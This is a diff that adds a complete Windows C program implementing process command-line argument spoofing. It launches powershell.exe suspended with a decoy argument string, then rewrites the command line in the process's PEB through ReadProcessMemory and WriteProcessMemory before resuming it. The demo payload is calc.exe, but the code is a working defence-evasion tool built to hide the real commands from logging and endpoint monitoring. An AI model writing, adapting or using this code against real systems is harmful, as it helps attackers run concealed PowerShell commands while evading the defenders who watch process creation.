@@ -1,0 +1,173 @@
+#include <stdio.h>
+#include <windows.h>
+#include <winternl.h>
+
+// Typedef for NtQueryInformationProcess
+typedef NTSTATUS(*fnNtQueryInformationProcess)(
+    HANDLE           ProcessHandle,
+    PROCESSINFOCLASS ProcessInformationClass,
+    PVOID            ProcessInformation,
+    ULONG            ProcessInformationLength,
+    PULONG           ReturnLength
+    );
+
+BOOL ReadFromTargetProcess(IN HANDLE hProcess, IN PVOID pAddress, OUT PVOID* ppReadBuffer, IN DWORD dwBufferSize) {
+    SIZE_T sNmbrOfBytesRead = 0;
+    *ppReadBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBufferSize);
+
+    if (!ReadProcessMemory(hProcess, pAddress, *ppReadBuffer, dwBufferSize, &sNmbrOfBytesRead) || sNmbrOfBytesRead != dwBufferSize) {
+        printf("[!] ReadProcessMemory Failed With Error : %d\n", GetLastError());
+        printf("[i] Bytes Read : %zu Of %d\n", sNmbrOfBytesRead, dwBufferSize);
+        HeapFree(GetProcessHeap(), 0, *ppReadBuffer);
+        return FALSE;
+    }
+
+    return TRUE;
+}
+
+BOOL WriteToTargetProcess(IN HANDLE hProcess, IN PVOID pAddressToWriteTo, IN PVOID pBuffer, IN DWORD dwBufferSize) {
+    SIZE_T sNmbrOfBytesWritten = 0;
+
+    if (!WriteProcessMemory(hProcess, pAddressToWriteTo, pBuffer, dwBufferSize, &sNmbrOfBytesWritten) || sNmbrOfBytesWritten != dwBufferSize) {
+        printf("[!] WriteProcessMemory Failed With Error : %d\n", GetLastError());
+        printf("[i] Bytes Written : %zu Of %d\n", sNmbrOfBytesWritten, dwBufferSize);
+        return FALSE;
+    }
+
+    return TRUE;
+}
+
+BOOL CreateArgSpoofedProcess(IN LPWSTR szStartupArgs, IN LPWSTR szRealArgs, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {
+    NTSTATUS STATUS = 0;
+    WCHAR szProcess[MAX_PATH];
+    STARTUPINFOW Si = { 0 };
+    PROCESS_INFORMATION Pi = { 0 };
+    PROCESS_BASIC_INFORMATION PBI = { 0 };
+    ULONG uReturn = 0;
+    PPEB pPeb = NULL;
+    PRTL_USER_PROCESS_PARAMETERS pParms = NULL;
+    BOOL result = FALSE;
+
+    RtlSecureZeroMemory(&Si, sizeof(STARTUPINFOW));
+    RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));
+    Si.cb = sizeof(STARTUPINFOW);
+
+    // Getting the address of the NtQueryInformationProcess function
+    fnNtQueryInformationProcess pNtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(GetModuleHandleW(L"ntdll"), "NtQueryInformationProcess");
+    if (pNtQueryInformationProcess == NULL) {
+        printf("[!] GetProcAddress for NtQueryInformationProcess failed.\n");
+        return FALSE;
+    }
+
+    lstrcpyW(szProcess, szStartupArgs);
+
+    if (!CreateProcessW(
+        NULL,
+        szProcess,
+        NULL,
+        NULL,
+        FALSE,
+        CREATE_SUSPENDED | CREATE_NO_WINDOW,
+        NULL,
+        L"C:\\Windows\\System32\\",
+        &Si,
+        &Pi)) {
+        printf("[!] CreateProcessW Failed with Error : %d\n", GetLastError());
+        return FALSE;
+    }
+
+    printf("\t[i] Process created successfully with PID: %d\n", Pi.dwProcessId);
+
+
+    //  ProcessInformationClass parameter is ProcessBasicInformation then buffer pointed to by the ProcessInformation parameter should be large enough to hold a single PROCESS_BASIC_INFORMATION structure
+    // Getting the PROCESS_BASIC_INFORMATION structure of the remote process which contains the PEB address
+    STATUS = pNtQueryInformationProcess(Pi.hProcess, ProcessBasicInformation, &PBI, sizeof(PROCESS_BASIC_INFORMATION), &uReturn);
+    if (STATUS != 0) {
+        printf("[!] NtQueryInformationProcess Failed With Error : 0x%0.8X\n", STATUS);
+        goto cleanup;
+    }
+
+    // Reading the PEB structure from its base address in the remote process
+    if (!ReadFromTargetProcess(Pi.hProcess, PBI.PebBaseAddress, (PVOID*)&pPeb, sizeof(PEB))) {
+        printf("[!] Failed To Read Target's Process PEB\n");
+        goto cleanup;
+    }
+
+    // Reading the RTL_USER_PROCESS_PARAMETERS structure from the PEB of the remote process
+    // Read an extra 0xFF bytes to ensure we have reached the CommandLine.Buffer pointer
+    // 0xFF is 255 but it can be whatever you like
+    if (!ReadFromTargetProcess(Pi.hProcess, pPeb->ProcessParameters, (PVOID*)&pParms, sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF)) {
+        printf("[!] Failed To Read Target's Process ProcessParameters\n");
+        goto cleanup;
+    }
+
+    // Writing the real argument to the process
+    if (!WriteToTargetProcess(Pi.hProcess, (PVOID)pParms->CommandLine.Buffer, (PVOID)szRealArgs, (DWORD)(lstrlenW(szRealArgs) * sizeof(WCHAR) + 1))) {
+        printf("[!] Failed To Write The Real Parameters\n");
+        goto cleanup;
+    }
+
+    // Print the address where the real arguments are written
+    printf("\t[i] Writing \"%ws\" As The Process Argument At Address: %p\n", szRealArgs, pParms->CommandLine.Buffer);
+
+
+    // Resuming the process with the new parameters
+    ResumeThread(Pi.hThread);
+
+    // Saving output parameters
+    *dwProcessId = Pi.dwProcessId;
+    *hProcess = Pi.hProcess;
+    *hThread = Pi.hThread;
+
+    // Checking if everything is valid
+    if (*dwProcessId != 0 && *hProcess != NULL && *hThread != NULL) {
+        result = TRUE;
+    }
+
+cleanup:
+    if (pPeb != NULL) {
+        HeapFree(GetProcessHeap(), 0, pPeb);
+    }
+    if (pParms != NULL) {
+        HeapFree(GetProcessHeap(), 0, pParms);
+    }
+    if (!result) {
+        if (Pi.hProcess != NULL) {
+            TerminateProcess(Pi.hProcess, 1);
+            CloseHandle(Pi.hProcess);
+        }
+        if (Pi.hThread != NULL) {
+            CloseHandle(Pi.hThread);
+        }
+    }
+
+    return result;
+}
+
+int main() {
+    WCHAR startupArgs[] = L"powershell.exe Totally Legit Argument";
+    WCHAR realArgs[] = L"powershell.exe -c calc.exe";
+    DWORD processId = 0;
+    HANDLE hProcess = NULL;
+    HANDLE hThread = NULL;
+
+    printf("[i] Target Process Will be Created With [Startup Arguments] \"powershell.exe Totally Legit Args\" \n");
+    printf("[i] The Actual Arguments [Payload Argument] \"powershell.exe -c calc.exe\" \n");
+
+    if (CreateArgSpoofedProcess(startupArgs, realArgs, &processId, &hProcess, &hThread)) {
+        printf("[+] Done \n");
+    }
+    else {
+        printf("Failed to create process.\n");
+    }
+    
+
+    if (hProcess != NULL) {
+        CloseHandle(hProcess);
+    }
+    if (hThread != NULL) {
+        CloseHandle(hThread);
+    }
+
+    return 0;
+}
